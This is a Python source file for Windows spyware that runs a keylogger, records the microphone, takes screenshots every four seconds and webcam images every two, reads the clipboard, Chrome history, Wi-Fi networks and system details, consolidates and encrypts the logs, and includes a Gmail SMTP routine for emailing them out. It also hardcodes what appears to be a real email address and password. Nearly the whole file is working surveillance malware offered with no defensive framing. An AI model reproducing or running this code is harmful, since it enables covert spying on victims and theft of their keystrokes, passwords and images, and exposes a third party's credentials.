# Libraries
import os
import socket
import platform
import smtplib
import subprocess
import threading
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab
import psutil
import sqlite3
import win32clipboard
from scipy.io.wavfile import write
import sounddevice as sd
from pynput import keyboard
from cv2 import VideoCapture, imwrite, destroyWindow
import schedule
import time

# Global Variables

keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
global screenshot_info 
screenshot_info = "screenshot.png"
webcam_shot_info = "webcam.png"
browser_history_info = "browser_history.txt"
wifi_info = "wifi_info.txt"
consolidated_log = "consolidated_log.txt"

email_address = "work.nihalrahman@gmail.com"  # Enter email here
password = "nihalrahman@2005"  # Enter password here
toaddr = "nd81167@gmail.com"  # Enter recipient email
file_path = os.getcwd() + "\\"  # File save path
key = Fernet.generate_key()  # Generate an encryption key
fernet = Fernet(key)

# Send Email
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Attached file: " + filename
    msg.attach(MIMEText(body, 'plain'))
    with open(attachment, 'rb') as attach_file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attach_file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {filename}")
        msg.attach(part)
    with smtplib.SMTP('smtp.gmail.com', 587) as s:
        s.starttls()
        s.login(fromaddr, password)
        s.sendmail(fromaddr, toaddr, msg.as_string())

# System Information
def system_information():
    with open(file_path + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address.\n")
        f.write(f"Processor: {platform.processor()}\nSystem: {platform.system()} {platform.version()}\n")
        f.write(f"Machine: {platform.machine()}\nHostname: {hostname}\nPrivate IP: {IPAddr}\n")

# Network Activity
def network_activity():
    with open(file_path + 'network_info.txt', "w") as f:
        connections = psutil.net_connections(kind='inet')
        for conn in connections:
            f.write(f"IP: {conn.raddr.ip if conn.raddr else 'N/A'}, Port: {conn.raddr.port if conn.raddr else 'N/A'}, Status: {conn.status}\n")

# Clipboard Data
def copy_clipboard():
    with open(file_path + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data + '\n')
        except:
            f.write("Clipboard Could not be copied.\n")

# Microphone Recording
def microphone():
    fs = 44100  # Sample rate
    seconds = 20  # Duration
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_path + audio_info, fs, myrecording)

# Define separate folders for screenshots and webcam images
screenshots_folder = os.path.join(file_path, "screenshots")  # Folder for screenshots
webcam_folder = os.path.join(file_path, "webcam_images")  # Folder for webcam images

# Create the folders if they don't exist
if not os.path.exists(screenshots_folder):
    os.makedirs(screenshots_folder)

if not os.path.exists(webcam_folder):
    os.makedirs(webcam_folder)

# Screenshot Capture
def screenshots():
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")  # Generate a unique timestamp
    screenshot_file =  f"/screenshots/screenshot_{timestamp}.png"  # Save in the 'screenshots' folder
    im = ImageGrab.grab()
    im.save(file_path + screenshot_file)

schedule.every(4).seconds.do(screenshots)

# Webcam Capture
def webcam_capture():
    cam = VideoCapture(0)
    result, image = cam.read()
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")  # Generate a unique timestamp
    webcam_shot_file =  f"/webcam_images/webcam_{timestamp}.png" # Save in the 'webcam_images' folder
    if result:
        imwrite(file_path + webcam_shot_file, image)
    cam.release()
    # destroyWindow("webCam")

schedule.every(2).seconds.do(webcam_capture)

# Browser History Fetch
def fetch_browser_history():
    history_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\History'
    try:
        conn = sqlite3.connect(history_path)
        cursor = conn.cursor()
        with open(file_path + browser_history_info, "w") as f:
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            for row in cursor.fetchall():
                f.write(f"URL: {row[0]}, Title: {row[1]}, Visits: {row[2]}, Last Visit: {datetime.utcfromtimestamp(row[3]/1000000 - 11644473600)}\n")
    except Exception as e:
        print("Could not read browser history:", e)

# Wi-Fi Information
def wifi_info_fetch():
    try:
        networks = subprocess.check_output("netsh wlan show networks", shell=True)
        with open(file_path + wifi_info, "w") as f:
            f.write(networks.decode('utf-8'))
    except Exception as e:
        print("Wi-Fi info fetch error:", e)

# Keylogger
def on_press(key):
    try:
        # Handle printable characters
        k = key.char if key.char else str(key)
    except AttributeError:
        # Handle special keys
        k = str(key)
    
    # Write directly to the file on each key press
    with open(file_path + keys_info, "a") as f:
        if k.find("Key.space") > -1:
            f.write("\n")  # Add a new line for space
        elif k.find("Key") == -1:
            f.write(k)  # Write printable keys
        else:
            f.write(f"[{k}]")  # Write special keys like [Key.enter], [Key.shift]
    

    

def write_file(keys):
    with open(file_path + keys_info, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Consolidate Data into Readable Format
def consolidate_data():
    with open(file_path + consolidated_log, "w") as f:
        f.write("System Information:\n")
        with open(file_path + system_info, "r") as sys_info:
            f.write(sys_info.read())
        f.write("\nNetwork Activity:\n")
        with open(file_path + 'network_info.txt', "r") as net_info:
            f.write(net_info.read())
        f.write("\nClipboard Data:\n")
        with open(file_path + clipboard_info, "r") as clipboard_data:
            f.write(clipboard_data.read())
        f.write("\nBrowser History:\n")
        with open(file_path + browser_history_info, "r") as browser_history:
            f.write(browser_history.read())
        f.write("\nWi-Fi Networks:\n")
        with open(file_path + wifi_info, "r") as wifi_data:
            f.write(wifi_data.read())
        f.write("\nKey Logs:\n")
        with open(file_path + keys_info, "r") as key_logs:
            f.write(key_logs.read())

# Encrypt Files
def encrypt_files(files_to_encrypt):
    for file in files_to_encrypt:
        with open(file, 'rb') as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file + ".encrypted", 'wb') as enc_file:
            enc_file.write(encrypted)
        # send_email(file + ".encrypted", file + ".encrypted", toaddr)

# Main Execution
system_information()
network_activity()
copy_clipboard()
microphone()
screenshots()
webcam_capture()
fetch_browser_history()
wifi_info_fetch()
consolidate_data()

def run_scheduled_tasks():
    while True:
        schedule.run_pending()
        time.sleep(1)

def start_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


schedule_thread = threading.Thread(target=run_scheduled_tasks)
schedule_thread.daemon = True
schedule_thread.start()

    # Start the keylogger in the main thread
start_keylogger()


files_to_encrypt = [file_path + system_info, file_path + keys_info, file_path + clipboard_info, file_path + wifi_info, file_path + consolidated_log]
encrypt_files(files_to_encrypt)
